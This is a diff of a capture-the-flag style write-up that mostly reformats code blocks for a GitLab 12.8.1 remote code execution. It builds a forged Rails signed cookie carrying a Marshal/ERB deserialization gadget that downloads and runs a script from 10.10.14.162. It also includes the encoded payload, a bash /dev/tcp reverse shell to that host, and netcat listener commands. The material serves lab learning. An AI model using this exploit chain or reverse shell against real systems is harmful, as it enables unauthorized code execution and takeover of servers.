@@ -231,37 +231,34 @@ Saving `secret_key_base`
 
 Now for create exploit RCE we need to up docker with gitlab version 12.8.1 in another virtual machine.
 
-`docker run --rm -d --hostname gitlab.vh -p 443:443 -p 80:80 -p 2222:22 --name gitlab gitlab/gitlab-ce:12.8.1-ce.0`
+```docker run --rm -d --hostname gitlab.vh -p 443:443 -p 80:80 -p 2222:22 --name gitlab gitlab/gitlab-ce:12.8.1-ce.0```
 
-`docker exec -ti gitlab /bin/bash`
+```docker exec -ti gitlab /bin/bash```
 
 Edit `secret_key` in /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
 
-`gitlab-ctl reconfigure`
+```gitlab-ctl reconfigure
+gitlab-ctl restart
+gitlab-rails console```
 
-`gitlab-ctl restart`
 
-`gitlab-rails console`
+```request = ActionDispatch::Request.new(Rails.application.env_config)
 
-`request = ActionDispatch::Request.new(Rails.application.env_config)`
+request.env["action_dispatch.cookies_serializer"] = :marshal
 
-`request.env["action_dispatch.cookies_serializer"] = :marshal`
+cookies = request.cookie_jar
 
-`cookies = request.cookie_jar`
+erb = ERB.new("<%= `wget http://10.10.14.162:8888/pasha.sh && chmod +x pasha.sh && /bin/bash pasha.sh` %>")
 
-`erb = ERB.new("<%= `wget http://10.10.14.162:8888/pasha.sh && chmod +x pasha.sh && /bin/bash pasha.sh` %>")`
+depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
 
-`depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)`
-
-`cookies.signed[:cookie] = depr`
+cookies.signed[:cookie] = depr```
 
 And we got a payload:
 ```AhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAY4jY29kaW5nOlVURi04Cl9lcmJvdXQgPSArJyc7IF9lcmJvdXQuPDwoKCBgd2dldCBodHRwOi8vMTAuMTAuMTQuMTYyOjg4ODgvcGFzaGEuc2ggJiYgY2htb2QgK3ggcGFzaGEuc2ggJiYgL2Jpbi9iYXNoIHBhc2hhLnNoYCApLnRvX3MpOyBfZXJib3V0BjoGRUY6DkBlbmNvZGluZ0l1Og1FbmNvZGluZwpVVEYtOAY7CkY6E0Bmcm96ZW5fc3RyaW5nMDoOQGZpbGVuYW1lMDoMQGxpbmVub2kAOgxAbWV0aG9kOgtyZXN1bHQ6CUB2YXJJIgxAcmVzdWx0BjsKVDoQQGRlcHJlY2F0b3JJdTofQWN0aXZlU3VwcG9ydDo6RGVwcmVjYXRpb24ABjsKVA==--5baee5481c899005c1ea5783cf6bbb6c9f644fec```
 
 Now we create reverse shell *pasha.sh*
-```
-bash -i >& /dev/tcp/10.10.14.162/1234 0>&1
-```
+```bash -i >& /dev/tcp/10.10.14.162/1234 0>&1```
 
 After start `python3 -m http.server 8888`
 And use `nc -nlvp 1234`
